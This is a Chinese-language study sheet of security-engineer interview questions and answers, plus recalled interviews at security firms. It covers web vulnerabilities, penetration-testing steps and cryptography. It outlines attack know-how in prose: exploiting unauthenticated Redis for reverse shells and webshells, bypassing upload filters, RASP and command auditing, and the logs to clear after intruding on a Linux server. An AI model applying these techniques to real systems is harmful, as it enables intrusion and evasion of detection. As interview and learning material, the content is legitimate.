**存储型xss在纯内网的环境中，可以怎么利用？**

xss本质上是任意代码执行，不要仅限于弹cookie，知名的XSS框架[beef](https://github.com/beefproject/beef)可以参考一下，xss可以修改网站页面，甚至可以扫描端口，如果你也在内网，可以嗅探密码等等。



**react native框架中的xss？**

JSON.stringfy将JavaScript对象转化为了JSON字符串，然后以全局变量的方式插入到了页面中，所以传的字符串有问题，可能会产生这个问题。



### Insecure Deserialization-不安全的反序列化

不安全的反序列化通常会导致**远程代码执行**。即使反序列化缺陷不会导致远程代码执行，它们也可用于执行攻击，包括重放攻击、注入攻击和提权攻击。



### Using Components with Known Vulnerabilities-使用已知漏洞的组件

组件（例如库、框架和其他软件模块）以与应用程序相同的权限运行。如果利用易受攻击的组件（如structs 2），此类攻击可能会导致严重的数据丢失或服务器接管。使用具有已知漏洞的组件的应用程序和 API 可能会破坏应用程序防御并引发各种攻击和影响。



### Insufficient Logging & Monitoring-日志和监控不足

日志记录和监控不足，再加上与事件响应的集成缺失或无效，使攻击者能够进一步攻击系统，**保持持久性**，转向更多系统，并篡改、提取或破坏数据。大多数违规研究表明检测违规的时间超过 200 天，通常由外部方而不是内部流程或监控检测到。



## OWASP Top 10 (2013及之前版本)

这里补充一下和2017不同的几个

### 不安全密码存储

对重要信息**不进行加密处理或加密强度不够**，或者没有安全的存储加密信息，都会导致攻击者获得重要信息。此风险还涉及Web应用以外的安全管理。

例如，2011年某博客网站被拖库，密码使用明文存储。



### 不安全的对象引用

指一个已经授权的用户，通过**更改访问时的一个参数**，从而**访问到了原本其并没有得到授权的对象**。Web应用往往在生成Web页面时会用它的真实名字，且并不会对所有的目标对象访问时来检查用户权限，所以这就造成了不安全的对象直接引用的漏洞。

例如，不进行鉴权时，抓包修改可能导致访问未授权链接，[例子](https://www.cnblogs.com/ScriptKid-Lu/p/9611017.html)。



### 限制URL访问失败

这个漏洞也是与认证相关的，这种漏洞具体是指在**系统已经对url的访问做了限制的情况下，但这种限制并没有生效**。常见的例子是系统没有对用户进行**角色的检查**，以及用户通过修改URL的action并指向未被授权页面就能访问该页面。



### 缺乏传输层保护

是一种**缺少了对敏感数据保护的漏洞**，不同在于这种漏洞更多关注的是数据在网络上的传输，造成这个漏洞的原因往往如下：

- 未能识别所有的敏感数据；
- 未能识别敏感数据发送的所有位置；
- 未能在每个位置对敏感数据提供合理的保护

例如，某网站使用http而不是https。



### 未验证的重定向或跳转

在Web应用中重定向是极为普通的，并且通常重定向所引发的目的是**带有用户输入参数的目的url**，而如果这些重定向未被验证，那么攻击者就可以引导用户访问他们想要用户访问的站点

同样，转发也是极为普遍的，本质上转发是在同一个应用中对一个新页面发送请求，并且有时是用参数来定义目标页面的。同样，如果参数未被验证，那么攻击者就可以利用其来绕过认证或是授权检查。

危害如下：

攻击者通过重定向可以试图安装恶意软件或诱使受害人泄露密码等敏感信息，通过转发可以绕过访问限制

如何防范：

1.避免使用重定向和转发

2.如果使用了，不要在确定目标时涉及到用户参数

3.如果无法避免使用用户参数，则应确保目标参数值对于当前用户是有效的并已授权



### CSRF-跨站伪造请求

**CSRF的原理是什么？**

构造链接，在自己的网站或邮箱等引诱已登录用户进行点击等操作，进而修改用户信息，如用户的头像、发货地址等。更有甚者，可能执行恶意操作，比如修改密码、添加/删除好友或者点赞/转发/评论/私信。

**注：攻击者不能获取信息，因为是浏览器发送请求给网站服务器。**



**如果是post****请求如何攻击？**

隐藏form表单，自动提交



**没有表单，只是post请求呢？**

ajax发送post请求



**如何防范CSRF？**

1. referer检测
2. 添加token
3. 二次验证



### 会话认证管理缺陷

**身份认证和会话管理常见安全问题**

- 账号或密码未做限制， 可暴力猜解。没有限制登录次数，加验证码
- 弱密码策略， 允许简单密码存在， 如123456 ， admin
- 密码找回方案存在缺陷， 如： 密保问题设计
- 密码更改方案存在缺陷
- cookie 作为认证凭证， 携带敏感信息
- Sessionid 没有时效限制， 特别是单点登录令牌在用户注销时没有失效
- 成功注册后， 会话ID 没有轮转。
- sessionid 和其他认证凭据使用未加密连接传输。
- 混用个性化数据的身份验证数据，个性化数据适于永久的cookie，而身份验证cookie不应是永久的



**认证会话管理洞防御**

- 设置验证码， 防止暴力猜解
- 强制复杂密码策略， 不允许默认弱密码存在
- 身份认证采用多因素认证或强身份认证
- 认证cookie 中，加入两个时间， 一个是“ 即使一直在活动，也要失效" 的时间，一个是“ 长时间不活动的失效时间"
- cookie设置http-only, 防止脚本读取
- cookie 设置Secure, 只允许https传输
- 网络传递认证凭证采用SSL/TLS加密

## SSRF-服务器端请求伪造

**SSRF原理？**

SSRF 形成的原因大都是由于**服务端提供了从其他服务器应用获取数据的功能，且没有对目标地址做过滤与限制**。比如从指定URL地址获取网页文本内容，加载指定地址的图片，文档等等。SSRF漏洞通过篡改获取资源的请求发送给服务器（服务器并没有检测这个请求是否合法的），然后服务器以他的身份来访问服务器的其他资源。SSRF利用存在缺陷的Web应用作为代理攻击远程和本地的服务器。



**SSRF攻击方法？**

利用file、dict、gopher协议

常用来进行：

- 端口扫描
- 攻击内网存在漏洞的服务
- 攻击Web应用进行指纹识别及其中的漏洞
- 如果PHP安装了expect扩展，可以通过expect协议执行系统命令

**SSRF无回显的时候应该怎么探测内网信息？**

Dnslog外带，参考：[巧用DNSlog实现无回显注入_weixin_30335575的博客-CSDN博客](https://blog.csdn.net/weixin_30335575/article/details/99877601)



**SSRF防御方法？**

限制请求的端口只能为Web端口，只允许访问HTTP和HTTPS的请求。

限制不能访问内网的IP，以防止对内网进行攻击

屏蔽返回的详细信息



## 文件上传&文件包含

**文件上传****漏洞原理？**

文件上传漏洞是指用户上传了一个可执行的脚本文件（php、jsp、xml、cer等文件），而WEB系统没有进行检测或逻辑做的不够安全。



**文件上传绕过方法？**

**前端检查**

- 抓包绕过，修改MIME



**后端检查**

- 利用WEB服务器解析错误，后缀绕过
- %00文件截断
- 黑名单绕过
- 文件格式检查绕过



**文件上传防御**

1. 文件类型判断（后缀白名单与MIME类型判断结合）
2. 文件重命名
3. 文件上传目录设置为不可执行



**文件包含与上传**

已知某网站存在LFI(本地文件包含)，但是无法上传任何文件，针对该情况有哪些利用方式?

查看敏感文件，如/etc/passwd
包含本地日志文件getshell，如ssh登录日志



## 点击劫持

**x-frame-option有哪些选项，作用是什么？**

- X-Frame-Options: DENY，禁止frame加载
- X-Frame-Options: SAMEORIGIN，同源可加载
- X-Frame-Options: ALLOW-FROM [http://xxx.com/](http://caibaojian.com/)，指定某域名与加载

用于抵抗点击劫持



## 浏览器安全

**返回证书错误的原因？**

- 证书不是权威机构发布的
- 证书中域名与服务器不对应
- 证书已过期



**讲一讲同源策略SOP？**

同源策略（Same Origin Policy）是浏览器最基本的的安全功能，限制了来自不同源的“document”或脚本，对当前的“document”读取或设置某些属性。

浏览器将不同的**根域名、子域名、端口、协议**认为是不同的域。由于浏览器安全限制，数据是不可以直接跨域请求的，除非目标域名授权你可以访问。



**讲一讲内容安全策略CSP？**

内容安全策略（Content Security Policy，简称 CSP），与内容安全有关，主要是用来**定义哪些资源可以被当前页面加载**，减少 XSS 的发生。最早在firefox 23中实现，当时使用的是 X-Content-Security-Policy，它使用了前置词的内容安全性策略，并以W3C CSP1.0规范作为标准。

CSP 有三类：

- Content-Security-Policy (Google Chrome)
- X-Content-Security-Policy(Firefox)
- X-WebKit-CSP (WebKit-based browsers, e.g. Safari)



**说一下jsonp跨域劫持？**

[知道创宇-jsonp劫持分析](http://blog.knownsec.com/2015/03/jsonp_security_technic/)



**HttpOnly的作用？**

如果cookie中设置了HttpOnly属性，那么通过js脚本将无法读取到cookie信息，这样能有效的防止**XSS攻击窃取cookie内容**的情况发生，这样就增加了cookie的安全性。



### PHP安全

**PHP中如何使用`phar://`伪协议触发反序列化，利用场景以及前提条件有哪些？**

利用phar文件会以序列化的形式存储用户自定义的meta-data这一特性，拓展了php反序列化漏洞的攻击面。

前提：可控制输入.phar文件，被攻击服务器有使用phar伪协议解析phar文件



**如何绕过`php.ini`中`disable_function`的限制，有哪些方法？**

[bypass disable_function](https://www.cnblogs.com/zw1sh/p/12632126.html)



**文件上传中`%00`截断的原理是什么，利用前提条件是什么?**

其实截断的原理也很简单，无论0x00还是%00，最终被解析后都是一个东西:**chr（0）**
chr()是一个函数，这个函数是用来返回参数所对应的字符的，也就是说，参数是一个ASCII码，返回的值是一个字符，类型为string。
那么chr(0)就很好理解了，对照ASCII码表可以知道，ASCII码为0-127的数字，每个数字对应一个字符，而0对应的就是NUT字符（NULL），也就是**空字符**，而截断的关键就是这个空字符，**当一个字符串中存在空字符的时候，在被解析的时候会导致空字符后面的字符被丢弃**。

利用条件：

```
</>复制代码 1.  php版本小于5.3.42.  php的magic/_quotes/_gpc为OFF状态
```



## 其他

**常用的漏洞检测工具?**

Nessus、OpenVAS（GVM）、X-scan、腾讯 T-Sec、华为 VSS



**中间人攻击如何防御？**

加密传输，例如，使用https代替http



**怎么对攻击溯源？举一个对攻击溯源的例子**

- 网站源码分析
- 日志分析
- 服务器端口分析
- 进程分析

举例：网站CPU、内存消耗暴增，某网页访问异常。

查看网站源码进行漏洞定位

日志分析，查看管理员等账号登录时间

服务器端口分析，查看是否开放不常用端口

进行分析，查看当前运行进程，top找到cpu，内存占比大的进程，进而找到后门脚本



**怎么检测webshell？**

检测危险函数，如，exec，eval等

文件名，检测常见wenshell文件名，如php一句话.php，php小马.php

日志分析，某页面总访问量小，访问IP数量少

机器学习建模，文本特征提取



**实现一个一句话webshell，绕过RASP的方式有哪些，绕过机器学习检测的方式有哪些，绕过AST-Tree的方式有哪些？**

rasp这类工具是基于java、php运行期的堆栈信息进行分析，可以尝试使用jni技术进行绕过。java技术栈中的jni的原理是使用java调用c、c++函数，具体实现的思路是jsp编译为class文件，该class通过jni技术调用另外一处dll里的函数绕过黑名单执行命令获取回显，即可实现rasp和安全防护软件的绕过。github地址：https://github.com/nanolikeyou/jniwebshell



**利用Gopher扩展哪些攻击面？**

Mysql、Redis等



**Struct2漏洞？**



**UDF提权？**

[MySQL UDF提权执行系统命令_谢公子的博客-CSDN博客_udf提权](https://blog.csdn.net/qq_36119192/article/details/84863268)



# 渗透测试

**渗透测试的流程?**

- 前期交互
- 信息搜集
- 威胁建模
- 漏洞扫描与分析
- 渗透攻击
- 后渗透攻击
- 痕迹清理
- 报告阶段



## 信息收集

**nmap扫描原理，Nmap扫描中的一些细节，针对什么情况使用哪种扫描?**

[网络安全-端口扫描神器Nmap使用详解与参数指导_lady_killer9的博客-CSDN博客](https://blog.csdn.net/lady_killer9/article/details/119982388)



**如何对外使用nmap扫描，遇到防火墙的情况又该怎么办?**

[网络安全-端口扫描神器Nmap使用详解与参数指导_lady_killer9的博客-CSDN博客](https://blog.csdn.net/lady_killer9/article/details/119982388)



**dmz区域的作用以及位置？**

DMZ是为了解决安装防火墙后**外部网络的访问用户不能访问内部网络服务器**的问题，而设立的一个非安全系统与安全系统之间的**缓冲区**。该缓冲区位于企业内部网络和外部网络之间的小网络区域内。在这个小网络区域内可以放置一些必须公开的服务器（如企业Web服务器、FTP服务器和论坛等）；另一方面，通过这样一个DMZ区域，更加有效地保护了内部网络。因为这种网络部署，比起一般的防火墙方案，对来自外网的攻击者来说又多了一道关卡。


**应急响应的步骤？**

收集信息：收集客户信息和中毒主机信息，包括样本。

判断类型：判断是否是安全事件，何种安全事件，勒索、挖矿、断网、DoS等等。

深入分析：日志分析、进程分析、启动项分析、样本分析。

清理处置：直接杀掉进程，删除文件，打补丁，抑或是修复文件。

产出报告：整理并输出完整的安全事件报告。

参考：[应急响应的整体思路和基本流程 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/terminal/192859.html)



**如何绕过CDN找到真实IP，请列举五种方法 ？**

1. 查看 IP 与 域名绑定的历史记录，可能会存在使用 CDN 前的记录
2. **使用国外主机解析域名：**国内很多 CDN 厂商因为各种原因只做了国内的线路，而针对国外的线路可能几乎没有，此时我们使用国外的主机直接访问可能就能获取到真实IP。
3. **网站邮件订阅查找：**RSS邮件订阅，很多网站都自带 sendmail，会发邮件给我们，此时查看邮件源码里面就会包含服务器的真实 IP 了。
4. **网络空间引擎搜索法：**常见的有[钟馗之眼](https://www.zoomeye.org/)，[shodan](https://www.shodan.io/)，[fofa搜索](https://fofa.so/)。以fofa为例，只需输入：title:“网站的title关键字”或者body：“网站的body特征”就可以找出fofa收录的有这些关键字的ip域名，很多时候能获取网站的真实ip。
5. **查询子域名：**毕竟 CDN 还是不便宜的，所以很多站长可能只会对主站或者流量大的子站点做了 CDN，而很多小站子站点又跟主站在同一台服务器或者同一个C段内，此时就可以通过查询子域名对应的 IP 来辅助查找网站的真实IP。

### 渗透攻击

**redis未授权访问如何利用，利用的前提条件是什么？有哪些利用方式？**

前提条件：redis配置错误，无密码，可以使用redis服务

利用方式：

- 利用计划任务执行命令反弹shell、往web物理路径写webshell
- 写ssh-keygen公钥然后使用私钥登陆

漏洞修复：

一切的源头都是未授权方访问，如果要允许远程连接一定要，开启protected-mode（保护模式）设置ip白名单，设置密码

更新高版本的redis服务，服务器使用低权限用户运行redis服务



**mysql提权方式有哪些?利用条件是什么?** 

条件：MySQL具有root的权限、MySQL以system权限运行、具有执行SQL语句的权限

- mof
- udf
- 反弹shell

**RPO漏洞**
[RPO攻击方式的探究 - FreeBuf网络安全行业门户](https://www.freebuf.com/articles/web/166731.html)



**复现过漏洞吗？复现的过程？**

这需要你自己写，找个有点名气的cve，复现一下



# Linux 安全

**怎样对一个linux服务器进行安全加固（怎样将不需要的端口off掉）？**

- kill 进程
- service xxx stop

**Linux 如何保护 SSH？**

禁止root登录，禁止空口令

如安全要求等级高，可以禁止口令，使用私钥文件登录，也可以使用证书+私钥的方式限时登录

**入侵 Linux 服务器后需要清除哪些日志？**

1. web日志的清理：access.log 和auth.log 位置在/var/log/下面。
2. 系统日志清理：/root/.bash_history
3. SSH 日志

**反弹 shell 的常用命令？从主机的层面，反弹shell如何监控？** 

[网络安全-反弹shell详解（攻击，检测与防御）](https://blog.csdn.net/lady_killer9/article/details/120318260)



**假设某Linux机器存在命令审计(方法未知)，有哪些可能的绕过方法?**

- 空格绕过
- 编码绕过
- 单双引号绕过
- 反斜杠绕过



**Linux常见的提权方法有哪些?**

- 内核漏洞提权
- SUID提权
- SUDO提权
- 反弹Shell



# 网络安全

**ARP攻击原理?**

[网络-ARP协议详解与ARP欺骗（中毒）攻击实战_lady_killer9的博客-CSDN博客_arp欺骗报文](https://blog.csdn.net/lady_killer9/article/details/110236990)



**简述ddos攻击，该攻击的原理是什么？描述下cc攻击？**

[网络安全-DoS与DDoS攻击原理（TCP、UDP、CC攻击等）与防御_lady_killer9的博客-CSDN博客_ddos攻击](https://blog.csdn.net/lady_killer9/article/details/119970012)



# 密码学

**CBC和ECB区别？**

ECB

优点：

1. 简单；
2. 有利于并行计算；
3. 误差不会被传递；

缺点：

1. 不能隐藏明文的模式；
2. 可能对明文进行主动攻击；

CBC

优点：

1. 不容易主动攻击，安全性好于ECB，是SSL、IPSec的标准；

缺点：

1. 不利于并行计算；
2. 误差传递；
3. 需要初始化向量IV；

**ECC原理了解吗？**

ECC是建立在基于**椭圆曲线的离散对数**问题上的密码体制，给定椭圆曲线上的一个点G，并选取一个整数k，求解K=kG很容易；反过来，在椭圆曲线上给定两个点K和G，若使K=kG，求整数k是一个难题。ECC就是建立在此数学难题之上,这一数学难题称为**椭圆曲线离散对数问题**。其中椭圆曲线上的**点K则为公钥**(注意公钥K是一个椭圆曲线点，在**OpenSSL**里面是用结构体EC_Point来表示的，整数k则为私钥。



**RSA是什么，应用在哪些地方？**

RSA是依赖于**大整数的素因子**分解的非对称算法，可应用于WEB，https协议等



**散列里MD5什么时候用？**

MD5进行信息摘要，可在WEB登录口令时使用，一般采用加盐的方式



**对称加密和非对称加密的区别?**

- 对称加密使用同一密钥，非对称加密使用两个密钥，公钥和私钥
- 对称加密一般耗时短，非对称加密耗时长
- 对称加密存在密钥传输安全性问题，非对称公钥可公开
- 对称加密不能提供



**数字签名的原理？**

1、将要签名的文件进行hash计算。

2、用私钥将文件的hash值进行签名。

3、除了签名外，还可以添加时间戳以指示签名时间。



1、将原文件进行hash计算得到hash值。

2、将签名的公钥从签名数据中计算出签名数据中的hash值。

3、将步骤1中得到的hash值和步骤2得到的hash值进行对比，如果对比结果一致则验证通过，反之验证失败。



**PKI的架构？**

1. 认证机构CA，注册机构RA
2. 证书和证书库
3. 密钥管理（密钥生成、密钥托管、密钥备份和恢复、密钥更新）
4. 应用系统编程接口API
5. 客户端软件



建议大家在简历上面具体写出几个漏洞，方便面试官提问和自己做准备。

无论如何，文章不可能覆盖所有面试题，也有面试官是根据你的简历来提问的，博主进行总结，希望大家能够由点及面，查漏补缺，文中答案仅供参考。祝大家拿到心仪的offer！！！

我的秋招面经：[渣硕的安全工程师面经（阿里，美团，腾讯，华为，字节）_笔经面经_牛客网](https://www.nowcoder.com/discuss/749954)

# 参考

[牛客网-安全面经](https://www.nowcoder.com/discuss/experience?tagId=682)

[网络安全-自学笔记_lady_killer9的博客-CSDN博客](https://blog.csdn.net/lady_killer9/article/details/106791542)





[网络安全-反序列化漏洞简介、攻击与防御](https://blog.csdn.net/lady_killer9/article/details/114730141)



[网络安全-点击劫持（ClickJacking）的原理、攻击及防御](https://blog.csdn.net/lady_killer9/article/details/108017437)

[Go-AES算法详解与代码](https://blog.csdn.net/lady_killer9/article/details/117633870)

[Go-Des和3Des算法详解与代码](https://blog.csdn.net/lady_killer9/article/details/117534938)

[Go-RSA加密解密详解与代码](https://blog.csdn.net/lady_killer9/article/details/118026802?ops_request_misc=%7B%22request%5Fid%22%3A%22163219365116780366514537%22%2C%22scm%22%3A%2220140713.130102334.pc%5Fblog.%22%7D&request_id=163219365116780366514537&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v2~rank_v29-1-118026802.pc_v2_rank_blog_default&utm_term=Rsa&spm=1018.2226.3001.4450)







[同源策略及跨域请求](https://blog.csdn.net/lady_killer9/article/details/114208892)

[Github-Gopherus](https://github.com/tarunkant/Gopherus.git)

[Github-web-sec-interview](https://github.com/we1h0/web-sec-interview/blob/master/README_CN.md)

[Github-sec_interview_known_list](https://github.com/tiaotiaolong/sec_interview_know_list)

[Github-Security-interview](https://github.com/Old-stan/Security-interview)

[Github-1earn](https://github.com/ffffffff0x/1earn)

[Github-sec-interview](https://github.com/d1nfinite/sec-interview)

[11种绕过CDN找到真实ip的方法](https://www.cnblogs.com/qiudabai/p/9763739.html)



## 无答案!!!!!!!!(一下基本无答案, 靠自己)

## 某奇安信!测试工程师面试

**2、SQl注入 原理 分类 防御**  原理：略  分类： 按[数据库](https://cloud.tencent.com/solution/database?from=20065&from_column=20065)分 Mysql、MsSQL、Oracle、Access  然后分三大类回显、盲注、带外，回显包括直接回显、报错，盲注包括布尔、延时，带外的话就是mysql的DnsLog注入、MsSQL的跨库查询、Oracle的带外函数

**Mysql用到什么函数？**  loadfile

**MsSQL呢，具体讲讲？**  OpenDataSource，当时是将当前数据库的数据通过这个函数的连接直接插入到自己搭建的数据库中，具体忘记了

**防御：**预处理，数据库语句提前编译好，输入不会被当做数据库代码来执行

**SQL写shell有了解过吗？**  Mysql：主要用到写文件的函数，outfile dumpfile

除了这种方式方式还有吗？

可能将一句话木马写入到数据库里、写日志文件也是一种回答，当时没答上来  MsSQL：主要用到存储过程，xp_cmdshell

**还了解过其他存储过程吗？**

暂时想不起来

Oracle写shell不会

**3、redis了解过吗？未授权漏洞**

了解不多，有在最近的学习计划中。

**4、XSS 原理 分类 利用**

原理：本质也是js、html代码注入   分类：略   利用：恶意跳转，劫持流量；获取后台登录地址，以及用户(包括管理员)Cookie；钓鱼

**HttpOnly有什么作用？**

无法获取Cookie

**还有吗？**

不知道

**5、反序列化了解过吗？**

序列化就是将对象序列化成字符串，反序列化就是一个相反的过程，在PHP的反序列化当中存在着魔术方法，执行序列化操作时自动执行的函数，当序列化字符串可控时，就可以构造序列字符串造成代码执行

**java的呢？**  了解不多，不过序列化的本质差不多，涉及到一个readObject函数

**6、XXE了解过吗？**  XML外部实体注入分有回显和没有回显，没有回显的就执行远程XML，(讲述靶场做题过程)可以将[服务器](https://cloud.tencent.com/product/cvm?from=20065&from_column=20065)的文件信息带出来

**7、CSRF和SSRF的区别**  跨站请求伪造，CSRF，主要就是利用Cookie，可以将嵌入比如iframe的网页发送给受害者，背着人家执行操作  服务器请求伪造，通过对方服务器向另外的服务器发起请求，会出现在比如说翻译功能这样的地方，可以连通内网，直接对内网进行渗透

**8、如果存在SSRF，端口探测时，限制了ip，如何绕过**

不知道。

后续了解：可以使用localhost、以及圆圈数字的方式进行绕过。

**9、常用工具**  Nmap、Burpsuite、Sqlmap

**10、**[**中间件**](https://cloud.tencent.com/product/tdmq?from=20065&from_column=20065)**漏洞了解过哪些 比如说Tomcat shiro**  了解不多，平常是遇到什么中间件，再搜索相关漏洞

**11、FastJson有了解过吗**  无  后续了解：FastJson是一个Java库，可以将Java对象转换为JSON格式，也可以将JSON字符串转化为Java对象，其可以操作任何Java对象。

**12、代码审计**  自己做过一些已有复现，比如适合新手的blueCMS，以及上述说的XXE、反序列化、还有变量覆盖漏洞都是通过结合代码审计学习的

**13、编程语言会哪些**  学过php、python、在学着用java做毕设

**14、PHP TP框架有学吗** 无

**15、内网渗透** 内网渗透了解不多，做过靶场，概述靶场内容。

**16、如何查看内网域名** net user/domain net time /domain

**17、GetShell之后，流量被限制怎么办**



**4、简单说一下sql注入有哪些类型？**

盲注、报错注入、宽字节注入。这个当时太慌了，忘了不少

**5、有用过哪些sql注入的工具吗？**

sqlmap

**6、sql注入除了GET和POST外还有其他什么方法吗？**

这个问题我没答上来，这跟上面哪个sql注入的类型有关，面试官说有存在向服务器提交数据的地方就存在sql注入。

**7、网站是为什么会出现sql注入漏洞？**

如果在开发的时候偷懒sql语句使用拼接参数就会导致能够利用单引号来闭合sql语句。

**8、对XSS漏洞有了解过吗？**

有了解过，就是[**java**](https://www.bmabk.com/) script闭合语句，与sql注入类似，通过这个漏洞能达到网站挂马、网页跳转、盗取cookie之类的问题。

**9、XSS漏洞有哪些类型？**

储存型、反射型。对这个其实我不是很了解，当时脑子一蒙就想起了这两个，其实还有一个dom型。

**10、XSS漏洞具体说通过哪个函数或者说方法盗取cookie的？**

xss漏洞我是真的没做过多少，当时也没回答上来，这里使用的函数是document.cookie。

**11、你对PHP学的如何？**

我当时说只能够阅读代码，没法进行开发，只用来写过反序列化漏洞poc，面试官说都能写反序列化的poc了还就只能阅读代码水平，表示不相信，但是我真的php学的不咋滴。

**12、PHP中反序列化需要满足什么条件才能利用？**

这我居然也没回答上来。。。。

这玩意我研究的其实挺久的，当时就只说了需要有unserialize()函数，还需要魔术函数，但是具体是啥魔术函数说不出来。其实就是__wakeup()函数,这部分我刚好没复习，明明记了笔记的。

**13、你对python学的如何？**

python比较擅长一点。这是实话，相对于php的话。。。。

**14、你用python做过什么？**

写过C段地址扫描，自动签到脚本，用django开发过一些网站。

**15、你用python最多写过多少行代码？**

300多行。其实我真正写的代码远远不止这么点，这是一些小脚本的代码量。

**16、看你参加过奇安信杯这具体是干什么的？**

一场线下的awd竞赛。

**17、简单讲一下在比赛中你的任务是什么？**

这里其实说歪了，不小心说成了平时bugku的awd竞赛的模式了。

前十五分钟进行防护，也就是挂waf，修复自己靶机的漏洞，后面的攻击阶段通过自己靶机的漏洞来攻击别人，因为靶机都一样嘛，然后也能通过模仿waf拦截到的攻击流量来攻击，说到这面试官又笑了，说这都是一个套路，当初他们读书时候也是这样弄的。

**18、看你在简历上写有参加教师的自动化运维立研课题研究，具体说一下是干什么的？**

就是通过python脚本来自动配置网络设备和服务器。

**19、说一下自动化运维里python脚本用到的什么模块？**

那个单词记不全，面试官就让我说个开头，我就说了p，也就是paramiko，但是我在弄这个项目的时候根本不是用的这个啊。。。。

我用的是netmiko，差点没绷得住，还好paramiko也的确能实现ssh。

**20、看你简历上写会使用[\**linux\**](https://www.bmabk.com/)和Windows Server配置各种服务，那么你会配置什么服务呢？**

windows Server 会配置一些基础服务，Linux会配置的很多，具体说了啥我忘了。

**21、校内服务器搭建与运维一等奖，具体比赛内容和评分标准是什么？**

就是windows和linux的五大基础服务，评分标准是会给出特定需求，按照特定的需求搭建来获取分数。

**22、有了解过中间件的漏洞吗，比如apache这种？**

这又给我问住了，刚好那是一点都没了解过，其实这种我也是有看过的，当时忘了，就只能老老实实说没了解过。

**23、文件上传漏洞如何实现？**

通过修改文件后缀和数据包中的文件类型来实现上传，这方面面试官居然就提了这么一句没往下问了。

**24、sql注入如果存在waf如何绕过？**

通过双写绕过和注释绕过\****\ 。这里面试完了我就想出了一大堆方法，还是紧张了。

**25、有了解过sql server和mysql有什么区别吗？**

这也问到我了，当时我就回了个注释方法不同，sql server我是真的没怎么用过。

**26、有使用过burpsuite吗？**

有通过burpsuite进行过抓过包和爆破。

**27、在爆破的时候有了解过爆破的模式吗？**

又是一个问住我的问题，这模式我就一直只用过爆破一个参数的模式。

后面的部分就是拉家常的环节，问我职业规划和家里有没有兄弟姐妹啊，那里人啊，现在住在哪啊等等，在后面就是到我反问的环节了，我就提了两个问题，关于薪资的问题这里就不写出来了。

**在入职之后会有培训吗？**

有，在实习期的前两个月会进行培训，比如代码审计、渗透流程、基础的漏洞利用之类的，具体记不清了。

**工作时间是怎么安排的？**

朝九晚五，每周工作五天。





\2. SQl注入 原理 分类 防御

\3. 按数据库了解哪些简单讲讲

\4. Mysql 写函数 ？

\5. 报错函数你了解哪些？

\6. 预编译原理是什么？

\7. MsSQL主要用到存储过程了解吗？

\8. Oracle写shell怎么写？

\9. redis了解过吗？未授权漏洞了解吗？

\10. XSS 原理 分类 利用

\11. HttpOnly有什么作用？

\12. 反序列化了解过吗？

\13. XXE了解过吗？

\14. CSRF和SSRF的区别

\15. 如果存在SSRF，端口探测时，限制了ip，如何绕过

\16. 常用工具

\17. 中间件漏洞了解过哪些 比如说Tomcat

\18. 代码审计流程仔细讲一讲，哪一种语言你最熟悉呢？

\19. 编程语言会哪些

\20. PHP TP框架有学吗

\21. 内网渗透流程能讲讲不

\22. 如何查看内网域名





# 0x00 字节跳动-渗透测试实习生

> 字节直接找朋友内推的效率很高，当天上午投简历，下午就约了面试，裸面挺痛苦的建议复习一下再去

1. 自我介绍
2. 渗透的流程
3. 信息收集如何处理子域名爆破的泛解析问题
4. 如何绕过CDN查找真实ip
5. phpinfo你会关注哪些信息
6. 有没有了解过权限维持
7. 说一个你感觉不错的漏洞，展开讲讲
8. 输出到href的XSS如何防御
9. samesite防御CSRF的原理
10. CSRF防御
11. json格式的CSRF如何防御
12. 浏览器解析顺序和解码顺序
13. 过滤逗号的SQL注入如何绕过
14. 过滤limit后的逗号如何绕过
15. fastjson相关漏洞
16. 说一个你知道的python相关的漏洞（SSTI原理，利用过程,payload相关的东西）开放性问答

# 0x01

# 0x02 深信服-漏洞研究员实习

时长：15分钟

1. 自我介绍
2. 在xx实习的时候做什么东西
3. 渗透测试的思路简单说一下
4. 护网在里面担当一个什么样的角色
5. 红队的一些思路
6. 拿下系统后有没有做横向
7. 前段时间那个log4j有研究吗，可以简单说一下吗
8. （继上一个问题）有哪些混淆绕过的方法
9. 内存马有没有了解过
10. 冰蝎、哥斯拉这些工具有没有了解过
11. 做攻击队的时候有没有研究过什么攻击，比如研究一些工具还是魔改什么的
12. 那么多漏洞和攻击，比较擅长哪一个
13. 说一下shiro反序列化的形成原因、利用链
14. 对一些bypass的方法有没有了解过，有什么姿势可以简单介绍一下
15. 反问

# 0x03

# 0x04 字节跳动-安全研究实习生

# 一面

时长：50分钟

1. 你投的岗位是安全研究实习生，你了解我们这边主要是做什么的吗

2. 自我介绍

3. 现在有什么比较想做的方向吗，比如你写的代码审计、攻防演练、你在学校的研究方向（密码学）其实是三个大方向，现在有什么比较想做的吗

4. 1. 说了代码审计、安全研究

5. 有没有审过开源框架、cms、中间件之类的

6. 面试官介绍了工作内容

7. 我看你简历上有几段实习经历和项目经历，先聊一下实习经历吧，在A主要做什么的

8. 详细聊聊入侵检测主要在做什么，遇到的问题

9. 关于入侵检测产生大量误报的原因，有没有分析过，有没有比较好的解决方法

10. 和A比起来，B的应该就比较偏攻击方对吧，有打仗（雾，面试官好像确实是这么说的）有代码审计，聊一下在B主要做了些什么

11. 审表达式引擎的步骤和思路

12. 刚刚你说的审计听起来好像和普通开发的审计差不多，都是通过程序流、文档去做，有没有从安全方面入手审计一些项目

13. xxe是怎么造成的，从代码层面来看

14. 我看你简历有很多攻防演练经历对吧，这几段攻防演练经历有没有哪一次印象比较深刻的，挑一个聊一聊

15. 你的这次攻击好像更多的是利用弱口令，有没有一些更有技巧的方法

16. 这个头像上传的webshell是怎么上传的

17. 还有什么其他的检验方式？要怎么绕过？

18. 这两天log4j漏洞很火，有没有去了解一下

19. 面试官最后介绍业务

20. 反问环节

# 一面plus-安全研发实习生

> 很奇葩的剧情，一面面试官面完告诉我有base北京base深圳问我是不是想要深圳的，我说是，结果过了一个多星期hr告诉我因为我一面面试官是北京的，然后我选了深圳，所以一面不作数，重新约了一面
> 接着一面这天中午又收到了感谢信，然后看官网状态是流程已终止，本以为没得面了没想到还是正常进行....
> 等到二面才发现原来已经变成安全研发了，本来我投的是安全研究的...

时长：45分钟

1. 自我介绍
2. A护网做了什么
3. 做哪一层的处置，waf？ids？
4. 遇到的问题是什么，有什么印象深刻的处置
5. 怎么解决误报过多的情况，有做过什么规则能解决这个情况的
6. 他的内网误报是在办公网还是生产网
7. 比如mysql也会执行powershell，怎么做防护（前面说了很多内网误报是因为有人写了ps脚本触发的）
8. 有没有挖过src
9. 在做攻防的时候，资产收集这块有没有什么经验介绍的
